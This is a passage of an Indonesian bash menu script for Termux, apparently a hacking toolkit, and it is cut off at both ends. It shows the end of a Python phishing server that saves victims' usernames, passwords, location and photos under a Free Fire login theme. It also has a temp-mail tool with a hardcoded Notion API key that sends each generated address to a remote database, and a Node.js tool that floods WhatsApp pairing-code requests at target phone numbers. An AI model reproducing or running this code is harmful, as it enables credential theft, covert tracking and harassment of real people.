                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
                f.write(f"User: {user}\n")
                f.write(f"Password: {password}\n")
                f.write(f"Lokasi: {lat}, {lon}\n")
                f.write(f"Foto: {len(img)} bytes\n")
                f.write("-" * 50 + "\n\n")    
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({"status": "success", "message": "Login berhasil"}).encode())
        else:
            self.send_error(404)
    def log_message(self, format, *args):
        return
if __name__ == "__main__":
    print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Server berjalan di : http://localhost:" + str(PORT) + "\033[0m")
    print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Menunggu data login..!!\033[0m")
    print("\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[36;1m Data akan disimpan di : freefire_data.txt\033[0m")
    httpd = HTTPServer(('0.0.0.0', PORT), Handler)
    httpd.serve_forever()
EOF
echo ""
python3 server.py
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
rm -f "$HOME/Peju.html" "$HOME/server.py"
clear
  ;;
     1|01)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo ""
echo -e "${r} PERINGATAN"
echo ""
echo -e "${g}
Anda wajib menggunakan termux api dan secara 
otomatis akan di arahkan pada termux api silahkan 
instal terlebih dahulu dan pasang termux api terlebih 
dahulu agar terkoneksi pada scanner wifi akan bisa 
mendapatkan informasi wifi dan lainya.
"
echo ""
echo -e "${r}Tekan Enter Untuk Menuju Ke Link Download"
echo -e "${y}Termux api"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING...!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading....!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading....!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.mediafire.com/file/941aiblyqg0g9y0/Termux-Api.apk/file"
echo ""
echo -e "${g} SELESAI MEMBUKA TERMUX API URL LINK..!!"
echo ""
echo -e "${c}Tekan Enter Untuk Menuju Ke Video Tutorial"
echo -e "${r}Ketika Termux Api Sudah Di Download."
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
echo ""
echo -e "${g} MEMBUKA VIDEO EDUKASI TUTORIAL"
echo ""
sleep 3 
xdg-open "https://k.top4top.io/m_3557v28i21.mp4"
echo ""
echo -e "${y}Silahkan tekan enter untuk menjalankan toolsnya..!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
cat > Wifi.py << 'EOF'
import os
import json
import subprocess
RED = "\033[1;31m"
YELLOW = "\033[1;33m"
GREEN = "\033[1;32m"
RESET = "\033[0m"
def pindai_wifi_print_info(label, value):                                                                                 print(f"{RED}{label} {YELLOW}: {GREEN}{value}{RESET}")
def pindai_wifi_scan():
    try:
        result = subprocess.check_output(["termux-wifi-scaninfo"])
        networks = json.loads(result)
        if not networks:
            print(RED + "❌ Tidak ada WiFi yang terdeteksi." + RESET)
            return
        print(RED + "\n\033[101m\033[1;32mBERIKUT INFORMASI JARINGAN WIFI SEKITAR\033[0m\n" + RESET)
        for net in networks:
            ssid   = net.get("ssid", "Unknown")
            bssid  = net.get("bssid", "Unknown")
            freq   = net.get("frequency_mhz", "Unknown")
            rssi   = net.get("rssi", "Unknown")
            ts     = net.get("timestamp", "Unknown")
            cbw    = net.get("channel_bandwidth_mhz", "Unknown")
            caps   = net.get("capabilities", "Unknown")
            pindai_wifi_print_info("SSID", ssid)
            pindai_wifi_print_info("BSSID", bssid)
            pindai_wifi_print_info("Frekuensi (MHz)", freq)
            pindai_wifi_print_info("RSSI (dBm)", rssi)
            pindai_wifi_print_info("Channel BW (MHz)", cbw)
            pindai_wifi_print_info("Keamanan", caps)
            pindai_wifi_print_info("Timestamp", ts)
            print("-" * 55)
    except Exception as e:
        print("❌ Error:", e)
def pindai_wifi():
    while True:
        os.system("clear")
        pindai_wifi_scan()
        input("\033[101m\033[1;32mPemindaian Wifi Selesai, Silahkan Enter\033[0m")
        break
if __name__ == "__main__":
    pindai_wifi()
EOF
chmod +x Wifi.py
python Wifi.py
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
rm -f "$HOME/Wifi.py"
clear
  ;;
     2|02)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
current_version="v1.2"
NOTION_API_KEY="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"
DATABASE_ID="146b68285d568084a040fb0c07726b18"
user_agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36"
)
ug="${user_agents[$RANDOM % ${#user_agents[@]}]}"
header=(
    -H "Host: api.internal.temp-mail.io"
    -H "Connection: keep-alive"
    -H "User-Agent: $ug"
    -H "Accept: application/json, text/plain, */*"
    -H "Application-Version: 2.2.14"
    -H "Save-Data: on"
    -H "Application-Name: web"
    -H "Origin: https://temp-mail.io"
    -H "Referer: https://temp-mail.io/"
    -H "Accept-Encoding: gzip, deflate, br"
    -H "Accept-Language: en-US,en;q=0.9,bn;q=0.8"
)
notion_headers=(
    -H "Authorization: Bearer $NOTION_API_KEY"
    -H "Content-Type: application/json"
    -H "Notion-Version: 2022-06-28"
)
terminal_width=$(tput cols)
logop() {
    local text="$1"
    while IFS= read -r line; do
        for ((i=0; i<${#line}; i++)); do
            printf "%s" "${line:$i:1}"
            sleep 0.01
        done
        printf "\n"
    done <<< "$text"
}
check_email_exists() {
    local email="$1"
    local url="https://api.notion.com/v1/databases/$DATABASE_ID/query"
    local data="{\"filter\":{\"property\":\"Email\",\"rich_text\":{\"equals\":\"$email\"}}}"
    response=$(curl -s -X POST "$url" "${notion_headers[@]}" -d "$data")
    results=$(echo "$response" | jq '.results | length')
    if [ "$results" -gt 0 ]; then
        return 0
    else
        return 1
    fi
}
add_email_to_notion() {
    local email="$1"
    if check_email_exists "$email"; then
        return
    fi
    local url="https://api.notion.com/v1/pages"
    local data="{\"parent\":{\"database_id\":\"$DATABASE_ID\"},\"properties\":{\"Title\":{\"title\":[{\"text\":{\"content\":\"Email Entry\"}}]},\"Email\":{\"rich_text\":[{\"text\":{\"content\":\"$email\"}}]}}}"
    curl -s -X POST "$url" "${notion_headers[@]}" -d "$data" > /dev/null
}
inbox_logo() {
    cok="ansi-rounded"
    local current_email="$1"
    local terminal_width=$(tput cols)
    echo "████████╗███████╗███╗   ███╗ █████╗ ██╗██╗         " | lolcat
    echo "╚══██╔══╝██╔════╝████╗ ████║██╔══██╗██║██║         " | lolcat
    echo "   ██║   █████╗  ██╔████╔██║███████║██║██║         " | lolcat
    echo "   ██║   ██╔══╝  ██║╚██╔╝██║██╔══██║██║██║         " | lolcat
    echo "   ██║   ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗    " | lolcat
    echo "   ╚═╝   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    " | lolcat
    echo ""
    echo "[ Development : By.Thonxyzz404 && By.Andraker ]" | lolcat 
    echo ""
    echo "📧 AKUN GMAIL ANDA : $current_email" | boxes -d "$cok"
    echo ""
    echo "[ ✔ ] 📥 INBOX [ ✔ ]" | lolcat
}
ext() {
    local message="THANK YOU FOR USING THIS TOOL"
    local border=$(printf '=%.0s' $(seq 1 "$terminal_width"))
    local separator=$(printf '%.0s-' $(seq 1 "$terminal_width"))
    local centered_message=$(printf "%*s\n" $(((${#message} + terminal_width)/2)) "$message")
    echo -e "\n$border\n$separator\n$centered_message\n$separator\n$border\n"
    exit 0
}
random_email() {
    local random_type=$((RANDOM % 6 + 10))
    local random_json="{\"min_name_length\":$random_type,\"max_name_length\":$random_type}"
    local new_domain="https://api.internal.temp-mail.io/api/v3/email/new"
    local random_response=$(curl -s -X POST "$new_domain" "${header[@]}" -d "$random_json")
    local random_mail=$(echo "$random_response" | jq -r '.email')
    local mail_token=$(echo "$random_response" | jq -r '.token')
    if [ -f "Database/all_domain.json" ]; then
        local files_data=$(cat "Database/all_domain.json")
        local dom_all=$(echo "$files_data" | jq '.domains')
        local new_entry="{\"email\":\"$random_mail\",\"token\":\"$mail_token\",\"digit\":\"$random_type\"}"
        local updated_data=$(echo "$dom_all" | jq ". + [$new_entry]")
        echo "{\"domains\":$updated_data}" > "Database/all_domain.json"
    else
        echo "{\"domains\":[{\"email\":\"$random_mail\",\"token\":\"$mail_token\",\"digit\":\"$random_type\"}]}" > "Database/all_domain.json"
    fi
    echo "$random_mail" > "Database/domain.txt"
    logop "[✓]Successfully membuat akun"
    logop "[✓]Created Gmail : $random_mail"
    add_email_to_notion "$random_mail"
    inbox_check_def
}
file_check() {
    local file="$1"
    [ -f "$file" ]
}
inbox_check_def() {
    clear
    echo " " > "Database/mailchk.mao"
    echo "0" > "Database/maocount.mao"
    local current_email=$(cat "Database/domain.txt")
    local inbox_check="https://api.internal.temp-mail.io/api/v3/email/$current_email/messages"
    inbox_logo "$current_email"
    trap 'ext' SIGINT
    while true; do
        local default_box=$(cat "Database/mailchk.mao")
        sleep 1.5
        local inbox_get=$(curl -s "$inbox_check" "${header[@]}" | jq .)
        if [ "$inbox_get" = "[]" ]; then
            continue
        fi
        local status_code=$(curl -s -o /dev/null -w "%{http_code}" "$inbox_check" "${header[@]}")
        if [ "$status_code" -eq 400 ]; then
            local error_msg=$(echo "$inbox_get" | jq -r '.message')
            if [ "$error_msg" = "Email not found" ]; then
                clear
                echo ""
                echo -e "${red}[ ${green}x ${red}]${cyan} Anda tidak memiliki akun."
                echo -e "${green}"
                sleep 2
                random_email
                return
            else
                echo "$error_msg"
                exit 1
            fi
        fi
        if [ "$default_box" != "$inbox_get" ]; then
            echo "$inbox_get" > "Database/mailchk.mao"
            local count=$(echo "$inbox_get" | jq 'length')
            for ((i=0; i<count; i++)); do
                local mao_count=$(cat "Database/maocount.mao")
                if [ "$mao_count" -lt $((i+1)) ]; then
                    echo $((i+1)) > "Database/maocount.mao"
                    local email_text=$(echo "$inbox_get" | jq ".[$i]")
                    local padding=$(( (terminal_width - 9) / 2 ))
                    logop "$(printf '%.0s-' $(seq 1 $padding))[ INBOX ]$(printf '%.0s-' $(seq 1 $((terminal_width - padding - 9))))"
                    logop ">>> Kekutan : $((i+1))%"
                    local created_at=$(echo "$email_text" | jq -r '.created_at')
                    if [[ "$created_at" =~ T ]]; then
                        local date=${created_at%%T*}
                        local time_part=${created_at#*T}
                        local time_cr=(${time_part//:/ })
                        local hour=$(( ${time_cr[0]} + 6 ))
                        local minute=${time_cr[1]}
                        local second=${time_cr[2]:0:2}
                        echo ">>> Date : $date, $hour:$minute:$second"
                    else
                        echo ">>> Date : $created_at"
                    fi
                    local from_field=$(echo "$email_text" | jq -r '.from')
                    if [[ "$from_field" =~ \< ]]; then
                        from_field=${from_field// </ • }
                        from_field=${from_field//>/}
                        from_field=${from_field//\"/}
                    fi
                    echo ">>> FROM : $from_field"
                    echo ">>> Gmail : $(echo "$email_text" | jq -r '.to')"
                    local cc=$(echo "$email_text" | jq -r '.cc')
                    if [ "$cc" != "null" ] && [ "$cc" != "None" ]; then
                        echo ">>> CC : $cc"
                    fi
                    echo ">>> SUBJECT : $(echo "$email_text" | jq -r '.subject')"
                    echo -e ">>> BODY : $(echo "$email_text" | jq -r '.body_text')"
                    echo "$(printf '%.0s-' $(seq 1 $padding))[ END ]$(printf '%.0s-' $(seq 1 $((terminal_width - padding - 5))))"
                    local attachments=$(echo "$email_text" | jq -r '.attachments[]')
                    if [ -n "$attachments" ]; then
                        local j=1
                        while read -r att; do
                            local att_id=$(echo "$att" | jq -r '.id')
                            local att_name=$(echo "$att" | jq -r '.name')
                            local att_size=$(echo "$att" | jq -r '.size')
                            echo -e ">>> ATTACHMENT NO. : $j"
                            echo ">>> VIEW ATTACHMENT : https://api.internal.temp-mail.io/api/v3/attachment/$att_id?preview=1"
                            echo ">>> DOWNLOAD ATTACHMENT : https://api.internal.temp-mail.io/api/v3/attachment/$att_id?download=1"
                            echo ">>> ATTACHMENT NAME : $att_name"
                            if [ "$att_size" -ge 1048576 ]; then
                                local size_mb=$(echo "scale=2; $att_size / 1048576" | bc)
                                echo ">>> ATTACHMENT SIZE : ${size_mb} M.B"
                            elif [ "$att_size" -ge 1024 ]; then
                                local size_kb=$(echo "scale=2; $att_size / 1024" | bc)
                                echo ">>> ATTACHMENT SIZE : ${size_kb} K.B"
                            else
                                echo ">>> ATTACHMENT SIZE : $att_size BYTES"
                            fi
                            ((j++))
                        done <<< "$attachments"
                    fi
                fi
            done <<< "$(echo "$inbox_get" | jq -c '.[]')"
        fi
    done
}
main() {
    clear
    logop "MOHON BERSABAR SEDANG PROSES..!!"
    sleep 3
    if [ ! -d "Database" ]; then
        mkdir Database
    fi
    if [ ! -f "Database/all_domain.json" ]; then
        echo '{"domains":[]}' > "Database/all_domain.json"
    fi
    if [ ! -f "Database/domain.txt" ]; then
        echo "" > "Database/domain.txt"
    fi
    if file_check "Database/domain.txt" && [ -s "Database/domain.txt" ]; then
        inbox_check_def
    else
        random_email
    fi
}
clear
message="MOHON BERSABAR SEDANG PROSES..!!"
printf "%*s\n" $(( (${#message} + terminal_width) / 2 )) "$message"
condition="on"
version="v1.2"
api="running"
if [ "$condition" = "on" ]; then
    if [ "$version" = "$current_version" ]; then
        if [ "$api" = "running" ]; then
            message="[ INFO ] API is running starting the main tool..!!"
            printf "%*s\n" $(( (${#message} + terminal_width) / 2 )) "$message"
            main
        else
            message="[ ERROR ] API is currently down please try again later."
            printf "%*s\n" $(( (${#message} + terminal_width) / 2 )) "$message"
            exit 1
        fi
    else
        message="[ INFO ] No updates are needed using the current version."
        printf "%*s\n" $(( (${#message} + terminal_width) / 2 )) "$message"
    fi
else
    message="[ ERROR ] Tool is disabled contact support for more information."
    printf "%*s\n" $(( (${#message} + terminal_width) / 2 )) "$message"
    exit 1
fi
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
       3|03)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
y='\033[33;1m'
p='\033[1;35m'
n='\033[0m'
echo ""
echo -e "${c}TOOLS SPAM PAIRING WHATSAPP"
echo -e "${p}Development ${c}: ${g}By.Thonxyzz404 && By.HanX"
echo ""
sleep 2
cat << 'EOF' > package.json
{
  "main": "index.js",
  "scripts": {
    "start": "node index.js"
  },
  "author": "apip",
  "license": "MIT",
  "dependencies": {
    "@whiskeysockets/baileys": "^6.5.0",
    "chalk": "^4.1.2",
    "pino": "^7.0.5",
    "readline": "^1.3.0"
  }
}
EOF
cat << 'EOF' > index.js
const readline = require('readline');
const chalk = require('chalk')
const { exec } = require('child_process');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
const pino = require('pino');
let targetNumber1 = '';
let targetNumber2 = '';
let selectedOption = '';
process.stdout.write('\x1Bc');
const isValidPhoneNumber = (phoneNumber) => {
  return /^\d{10,14}$/.test(phoneNumber);
};
const spamPairingCode = async () => {
  let { state } = await useMultiFileAuthState('Hello');
  let { version } = await fetchLatestBaileysVersion();
  let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  if (selectedOption === '1') {
    process.stdout.write('\x1Bc');
    console.log(chalk.greenBright.bold(chalk.bgBlack(`
⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿
`)));
    if (targetNumber1 === '' || !isValidPhoneNumber(targetNumber1)) {
      console.log(chalk.yellow.bold(`Enter Target Number`));
      rl.question('\x1b[1m\x1b[33mContoh 628***\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', async (target) => {
        targetNumber1 = target.replace(/[^0-9]/g, '').trim();
        if (isValidPhoneNumber(targetNumber1)) {
          startSpamming(sucked, targetNumber1);
          process.stdout.write('\x1Bc');
        } else {
          console.log(chalk.white.bold(`\nMasukan Dengan Benar ${chalk.red.bold('!!')}`));
          setTimeout(() => {
          spamPairingCode();
          }, 1500);
        }
      });
    } else {
      startSpamming(sucked, targetNumber1);
    }
  } else if (selectedOption === '2') {
    process.stdout.write('\x1Bc');
    console.log(chalk.greenBright.bold(chalk.bgBlack(`
⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
⣿⣿⣷⠀⠈⢿⣿⣕⠻⢿⢋⣾⢷⡏⣼⣿⠇⣿⡘⣷⡹⣮⡻⣷⡙⣷⣌⠮⢋⣴⣿⣿⣿⣿⣿⣿⠗⣸⣿⣿⣿
⣿⣿⣿⡄⣠⣾⣿⣿⡿⡲⢣⡿⡏⣰⣿⡿⠈⣿⡇⢿⣷⠹⠷⣈⢾⡞⠿⣶⣘⠻⣿⣿⣿⣿⣷⣆⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠉⣹⣿⡷⠐⣕⢏⢼⢣⣷⣝⢃⢣⡿⡇⢘⣭⣆⣿⠟⣥⠳⡜⡝⢿⣧⡹⣿⣿⡿⣯⠋⠀⣿⣿⣿⣿
⣿⣿⣿⣧⠸⠿⣿⡁⣾⢡⣞⡦⢈⢿⡟⡎⣼⣶⠇⣿⣿⠿⡐⢿⣻⣧⡹⡌⢎⢿⡧⡈⠁⠀⠀⠀⣰⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡆⢀⣼⠇⣾⡾⡅⢸⡎⠜⢘⠻⣣⢏⠀⣵⣿⡟⠎⠿⠿⣷⣡⠃⡱⡨⣞⣇⠀⢰⡀⢹⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠁⢠⡟⢠⣿⣿⢠⠘⠀⠄⡌⣿⣿⢸⡄⣯⡶⢀⣿⣆⢙⢿⣕⠪⣶⡕⠝⣿⡈⠌⡇⢹⣿⣿⣿⣿
⣿⣿⣿⣿⡿⠀⢾⠇⢼⣿⢟⠈⣄⠲⡇⡇⣿⠛⣼⡇⣿⠃⡨⠛⠉⠉⠀⠐⠀⣿⣿⣎⢪⣧⠘⢠⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠈⢸⠘⣼⡿⣿⠐⠛⡀⠁⠒⠉⢰⣿⠇⣱⣧⣷⣿⢂⠰⡤⢉⡄⣿⣟⣿⠈⣿⠠⡘⡀⢿⣿⣿⣿
⣿⣿⣿⣿⣧⠀⢸⡇⢾⣿⡄⢀⢺⡗⣦⣀⢸⣿⣿⣿⣿⣿⣿⣿⣮⣭⣵⣿⢸⣿⣿⢿⡆⣯⠁⠄⡇⠸⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠘⡅⣺⢯⡇⠈⢷⣽⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢇⡟⣸⢯⡟⡆⣿⠰⢐⠘⡀⢿⣿⣿
⣿⣿⣿⣿⣷⠀⠀⢳⢸⢯⡇⢰⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡼⠁⡿⣯⢁⡇⢾⠀⡌⠀⠐⠘⣿⣿
⣿⣿⣿⣿⣿⠀⡐⠈⠸⣏⡇⠀⠁⠹⣿⣿⣿⣿⣿⣿⣛⣿⣿⣿⣿⣿⠑⠁⡸⢻⡍⢸⠀⢸⡂⠱⠀⠇⠀⣿⣿
⣿⣿⣿⣿⠏⢠⡝⠱⡀⡻⣼⠀⠐⠀⠊⠛⠿⣿⣿⣿⣿⣿⣿⣿⠿⠃⡀⠠⢡⡟⠀⡿⠀⢸⠀⠃⠄⠀⡀⢸⣿
⡟⡻⢛⡡⠊⣠⠇⠀⡗⢸⢱⠀⢶⣶⠂⣤⣤⣀⡉⠛⠿⢟⡫⠕⣊⢠⡄⢠⡗⠀⣸⠱⠀⡐⠆⠁⢢⠀⠁⢸⣿
⣷⣦⡄⠀⣜⠃⠀⢠⠘⠆⠂⢇⠀⠉⠀⠾⣟⣿⢿⣷⣦⣥⣒⠿⠇⠈⡄⠞⡐⢀⣃⣃⡀⠑⠖⠀⠩⡄⠂⢸⣿
⣿⣿⡃⡜⢡⢂⠀⣸⢸⢀⠃⠈⡜⡙⡄⢠⣤⣈⡉⠙⠋⠻⠿⠿⡆⠸⡅⠸⢡⢀⡤⠖⠰⢿⣆⠀⠀⠈⠀⠀⣿
⣿⣿⢁⠃⠸⡌⢰⡱⠈⢀⠺⠿⣦⡘⠃⢸⣿⣻⡿⣿⠷⣶⣶⡤⡄⠓⡇⠡⠊⢠⠶⠗⠖⢿⡟⡄⠀⠀⢀⣴⣿
`)));
    
    if (targetNumber1 === '' || targetNumber2 === '' || !isValidPhoneNumber(targetNumber1) || !isValidPhoneNumber(targetNumber2)) {
        console.log(chalk.yellow.bold(`Enter Target Number\nExample: 628***`));
        rl.question('\x1b[1m\x1b[33mTarget 1\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', async (target1) => {
            targetNumber1 = target1.replace(/[^0-9]/g, '').trim();
            rl.question('\x1b[1m\x1b[33mTarget 2\x1b[0m\x1b[1m\x1b[31m: \x1b[0m\x1b[1m\x1b[37m', async (target2) => {
                targetNumber2 = target2.replace(/[^0-9]/g, '').trim();
                if (isValidPhoneNumber(targetNumber1) && isValidPhoneNumber(targetNumber2)) {
                    startAlternateSpamming();
                } else {
                    console.log(chalk.white.bold(`\nMasukan Dengan Benar ${chalk.red.bold('!!')}`));
                    setTimeout(() => {
                        spamPairingCode();
                    }, 1500);
                }
            });
        });
    } else {
        startAlternateSpamming();
    }
    function startAlternateSpamming() {
        const initialTarget1 = targetNumber1;
        const initialTarget2 = targetNumber2;
        function alternateSpamming(sucked, target1, target2) {
            startSpamming(sucked, target1, target2);
            const delayDuration = 2000;
            setTimeout(() => {
                startSpamming(sucked, target2, target1);
            }, delayDuration);
        }
        alternateSpamming(sucked, initialTarget1, initialTarget2);
    }
} else {
  process.stdout.write('\x1Bc');
  console.log(chalk.hex('#00BFFF').bold(chalk.bgBlack(`
⣿⣿⣿⠛⠻⢿⣿⣿⣿⣷⣾⣝⡻⢿⣿⣯⣽⣹⡚⣽⣖⣺⣯⠭⣽⣿⣿⣉⠻⣙⣤⣾⠏⠀⠀⠀⢛⣫⣶⣿⣿
⣿⣿⣿⠀⠑⢦⣤⣉⣉⠛⠛⡷⢿⡗⢉⣉⠉⣉⢍⣁⡒⢶⣶⣾⣩⠝⣫⣵⣿⣿⠿⣁⣠⣶⠀⠀⢿⣿⡿⠿⢛
⣿⣿⡇⠀⠀⠀⠙⠿⣿⣿⣿⡶⣢⣺⡿⣡⡾⣿⢧⡪⡹⢷⣍⠿⣟⡟⢟⢿⣽⡶⢊⣼⣿⣿⣀⡀⠀⢰⣾⣿⣿
